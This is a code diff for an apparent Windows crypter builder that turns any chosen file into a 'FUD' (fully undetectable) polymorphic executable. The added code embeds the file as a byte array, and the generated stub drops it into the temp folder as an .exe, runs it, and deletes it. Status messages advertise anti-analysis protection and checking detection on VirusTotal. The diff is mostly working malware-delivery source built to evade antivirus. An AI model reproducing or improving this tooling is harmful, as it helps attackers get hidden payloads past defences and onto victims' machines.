@@ -126,8 +126,30 @@ int VS2022_AutoCompile(const char* sourceFile, const char* outputFile) {
     return result;
 }
 
-// Advanced polymorphic source generator (VS2022 compatible)
-void generatePolymorphicExecutable(char* sourceCode, size_t maxSize, EncryptionType encType, DeliveryType delType) {
+// Advanced polymorphic source generator with payload embedding (VS2022 compatible)
+void generatePolymorphicExecutableWithPayload(char* sourceCode, size_t maxSize, EncryptionType encType, DeliveryType delType, const char* inputFilePath) {
+    // Read and prepare payload from input file
+    char* payloadData = nullptr;
+    size_t payloadSize = 0;
+    
+    if (inputFilePath && strlen(inputFilePath) > 0) {
+        FILE* inputFile = nullptr;
+        fopen_s(&inputFile, inputFilePath, "rb");
+        if (inputFile) {
+            fseek(inputFile, 0, SEEK_END);
+            payloadSize = ftell(inputFile);
+            fseek(inputFile, 0, SEEK_SET);
+            
+            if (payloadSize > 0 && payloadSize < 10485760) { // Max 10MB payload
+                payloadData = (char*)malloc(payloadSize);
+                if (payloadData) {
+                    fread(payloadData, 1, payloadSize, inputFile);
+                }
+            }
+            fclose(inputFile);
+        }
+    }
+    
     // Generate unique random variables
     char randVar1[20], randVar2[20], randVar3[20], randVar4[20], randVar5[20], randVar6[20];
     srand((unsigned int)(time(NULL) ^ GetTickCount() ^ GetCurrentProcessId()));
@@ -329,26 +351,86 @@ void generatePolymorphicExecutable(char* sourceCode, size_t maxSize, EncryptionT
                 "}\n";
             break;
             
-        default: // DEL_BENIGN
-            payloadFunction = "benign_delivery";
-            deliveryPayload = 
-                "void execute_benign_delivery() {\n"
-                "    char validation_message[] = \"System Security Validation Completed Successfully\";\n"
-                "    char system_info[512];\n"
-                "    DWORD tickCount = GetTickCount();\n"
-                "    DWORD processId = GetCurrentProcessId();\n"
-                "    sprintf_s(system_info, sizeof(system_info),\n"
-                "              \"Security Validation Report\\n\\n\"\n"
-                "              \"Status: PASSED\\n\"\n"
-                "              \"Timestamp: %lu\\n\"\n"
-                "              \"Process ID: %lu\\n\"\n"
-                "              \"Validation Level: Enterprise\\n\\n\"\n"
-                "              \"All system integrity checks completed.\",\n"
-                "              tickCount, processId);\n"
-                "}\n";
+        default: // DEL_BENIGN or actual payload execution
+            payloadFunction = "payload_delivery";
+            if (payloadData && payloadSize > 0) {
+                deliveryPayload = 
+                    "void execute_payload_delivery() {\n"
+                    "    // Extract embedded payload to temporary file\n"
+                    "    char temp_path[MAX_PATH];\n"
+                    "    GetTempPathA(MAX_PATH, temp_path);\n"
+                    "    char temp_file[MAX_PATH];\n"
+                    "    sprintf_s(temp_file, MAX_PATH, \"%s\\\\payload_%lu.exe\", temp_path, GetTickCount());\n"
+                    "    \n"
+                    "    // Write payload data to file\n"
+                    "    FILE* payload_file = nullptr;\n"
+                    "    fopen_s(&payload_file, temp_file, \"wb\");\n"
+                    "    if (payload_file) {\n"
+                    "        fwrite(embedded_payload_data, 1, sizeof(embedded_payload_data), payload_file);\n"
+                    "        fclose(payload_file);\n"
+                    "        \n"
+                    "        // Execute payload\n"
+                    "        STARTUPINFOA si = {0};\n"
+                    "        PROCESS_INFORMATION pi = {0};\n"
+                    "        si.cb = sizeof(si);\n"
+                    "        \n"
+                    "        if (CreateProcessA(temp_file, NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {\n"
+                    "            WaitForSingleObject(pi.hProcess, 5000); // Wait 5 seconds\n"
+                    "            CloseHandle(pi.hProcess);\n"
+                    "            CloseHandle(pi.hThread);\n"
+                    "        }\n"
+                    "        \n"
+                    "        // Clean up temporary file\n"
+                    "        Sleep(1000);\n"
+                    "        DeleteFileA(temp_file);\n"
+                    "    }\n"
+                    "}\n";
+            } else {
+                deliveryPayload = 
+                    "void execute_payload_delivery() {\n"
+                    "    char validation_message[] = \"System Security Validation Completed Successfully\";\n"
+                    "    char system_info[512];\n"
+                    "    DWORD tickCount = GetTickCount();\n"
+                    "    DWORD processId = GetCurrentProcessId();\n"
+                    "    sprintf_s(system_info, sizeof(system_info),\n"
+                    "              \"Security Validation Report\\n\\n\"\n"
+                    "              \"Status: PASSED\\n\"\n"
+                    "              \"Timestamp: %lu\\n\"\n"
+                    "              \"Process ID: %lu\\n\"\n"
+                    "              \"Validation Level: Enterprise\\n\\n\"\n"
+                    "              \"All system integrity checks completed.\",\n"
+                    "              tickCount, processId);\n"
+                    "}\n";
+            }
             break;
     }
     
+    // Generate embedded payload data as byte array
+    char* payloadByteArray = nullptr;
+    if (payloadData && payloadSize > 0) {
+        size_t arraySize = (payloadSize * 6) + 1024; // Space for hex formatting
+        payloadByteArray = (char*)malloc(arraySize);
+        if (payloadByteArray) {
+            strcpy_s(payloadByteArray, arraySize, "// Embedded payload data\nstatic unsigned char embedded_payload_data[] = {\n");
+            
+            for (size_t i = 0; i < payloadSize; i++) {
+                char hexByte[8];
+                sprintf_s(hexByte, sizeof(hexByte), "0x%02X", (unsigned char)payloadData[i]);
+                strcat_s(payloadByteArray, arraySize, hexByte);
+                
+                if (i < payloadSize - 1) {
+                    strcat_s(payloadByteArray, arraySize, ",");
+                    if ((i + 1) % 16 == 0) {
+                        strcat_s(payloadByteArray, arraySize, "\n");
+                    } else {
+                        strcat_s(payloadByteArray, arraySize, " ");
+                    }
+                }
+            }
+            strcat_s(payloadByteArray, arraySize, "\n};\n\n");
+        }
+    }
+
     // Generate complete VS2022 compatible source code
     sprintf_s(sourceCode, maxSize,
         "#include <windows.h>\n"
@@ -360,6 +442,7 @@ void generatePolymorphicExecutable(char* sourceCode, size_t maxSize, EncryptionT
         "#include <string>\n"
         "%s"
         "\n"
+        "%s"
         "// Advanced polymorphic variables - VS2022 optimized\n"
         "static volatile int %s = %d;\n"
         "static volatile int %s = %d;\n"
@@ -466,6 +549,7 @@ void generatePolymorphicExecutable(char* sourceCode, size_t maxSize, EncryptionT
         "}\n",
         
         deliveryIncludes,
+        payloadByteArray ? payloadByteArray : "",
         randVar1, polyVars[0], randVar2, polyVars[1], randVar3, polyVars[2],
         randVar4, polyVars[3], randVar5, polyVars[4], randVar6, polyVars[5],
         
@@ -499,13 +583,24 @@ void generatePolymorphicExecutable(char* sourceCode, size_t maxSize, EncryptionT
         
         payloadFunction
     );
+    
+    // Cleanup allocated memory
+    if (payloadData) {
+        free(payloadData);
+    }
+    if (payloadByteArray) {
+        free(payloadByteArray);
+    }
 }
 
 // Thread function for VS2022 auto-compilation
 DWORD WINAPI VS2022_GenerationThread(LPVOID lpParam) {
     char* outputPath = (char*)lpParam;
     
-    // Get user settings
+    // Get user settings including input file
+    char inputPath[260];
+    GetWindowTextA(hInputPath, inputPath, sizeof(inputPath));
+    
     char batchText[16];
     GetWindowTextA(hBatchCount, batchText, sizeof(batchText));
     int batchCount = atoi(batchText);
@@ -524,9 +619,9 @@ DWORD WINAPI VS2022_GenerationThread(LPVOID lpParam) {
         // Update progress
         PostMessage(hMainWindow, WM_USER + 1, MAKEWPARAM(batch, batchCount), 0);
         
-        // Generate polymorphic source code
-        char sourceCode[32768]; // Large buffer for VS2022 features
-        generatePolymorphicExecutable(sourceCode, sizeof(sourceCode), encType, delType);
+        // Generate polymorphic source code with actual payload embedding
+        char sourceCode[65536]; // Larger buffer for embedded payloads
+        generatePolymorphicExecutableWithPayload(sourceCode, sizeof(sourceCode), encType, delType, inputPath);
         
         // Create temporary source file
         char tempSource[128];
@@ -567,14 +662,14 @@ DWORD WINAPI VS2022_GenerationThread(LPVOID lpParam) {
                 GetFileSizeEx(hFile, &fileSize);
                 CloseHandle(hFile);
                 
-                if (fileSize.QuadPart > 16384) { // >16KB for VS2022 optimized
-                    // SUCCESS - Production ready executable
+                if (fileSize.QuadPart > 32768) { // >32KB for VS2022 with embedded payloads
+                    // SUCCESS - Production ready executable with embedded payload
                     DeleteFileA(tempSource);
                     if (batch == batchCount - 1) {
                         PostMessage(hMainWindow, WM_USER + 3, 1, 0);
                     }
                 } else {
-                    // Small executable warning
+                    // Small executable warning - may be benign or missing payload
                     DeleteFileA(tempSource);
                     if (batch == batchCount - 1) {
                         PostMessage(hMainWindow, WM_USER + 4, 0, 0);
@@ -872,18 +967,20 @@ LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam) 
             EnableWindow(hGenerateButton, TRUE);
             
             if (wParam) {
-                SetWindowTextAnsi(hStatusText, "VS2022 FUD EXECUTABLE READY - UPLOAD TO VIRUSTOTAL!");
+                SetWindowTextAnsi(hStatusText, "VS2022 FUD EXECUTABLE WITH EMBEDDED PAYLOAD READY - UPLOAD TO VIRUSTOTAL!");
                 MessageBoxA(hwnd, 
                     "VS2022 Enterprise FUD Executable Generated Successfully!\n\n"
                     "Features:\n"
                     "- VS2022 optimized compilation\n"
+                    "- ACTUAL PAYLOAD EMBEDDED (not just stub)\n"
                     "- Enterprise-grade polymorphic signatures\n"
                     "- All encryption methods implemented\n"
                     "- Multi-vector delivery support\n"
                     "- Production-ready for VirusTotal testing\n"
-                    "- Advanced anti-analysis protection\n\n"
-                    "File is ready for immediate upload!",
-                    "VS2022 FUD SUCCESS", MB_OK | MB_ICONINFORMATION);
+                    "- Advanced anti-analysis protection\n"
+                    "- Runtime payload extraction and execution\n\n"
+                    "File contains real payload and is ready for immediate upload!",
+                    "VS2022 FUD SUCCESS - PAYLOAD EMBEDDED", MB_OK | MB_ICONINFORMATION);
             } else {
                 SetWindowTextAnsi(hStatusText, "VS2022 compilation failed - check output directory");
             }
@@ -897,16 +994,18 @@ LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam) 
             isGenerating = FALSE;
             SetWindowTextAnsi(hGenerateButton, "Generate FUD Executable");
             EnableWindow(hGenerateButton, TRUE);
-            SetWindowTextAnsi(hStatusText, "VS2022 executable generated - optimization recommended");
+            SetWindowTextAnsi(hStatusText, "VS2022 executable generated - may lack embedded payload");
             MessageBoxA(hwnd,
                 "VS2022 FUD Executable Generated (Size Warning)\n\n"
-                "The executable was created but may benefit from optimization.\n"
-                "This version should still work for VirusTotal testing.\n\n"
+                "The executable was created but appears smaller than expected.\n"
+                "This may indicate missing payload embedding or benign mode.\n\n"
                 "For optimal results:\n"
-                "- Use different encryption method\n"
+                "- Ensure input file is selected and valid\n"
+                "- Try different encryption method\n"
                 "- Try alternative delivery vector\n"
-                "- Enable VS2022 link-time optimization",
-                "VS2022 Executable Generated", MB_OK | MB_ICONWARNING);
+                "- Check if payload was properly embedded\n\n"
+                "This version may still work for VirusTotal testing.",
+                "VS2022 Executable Generated - Size Warning", MB_OK | MB_ICONWARNING);
             SendMessage(hProgressBar, PBM_SETPOS, 0, 0);
             return 0;
         }
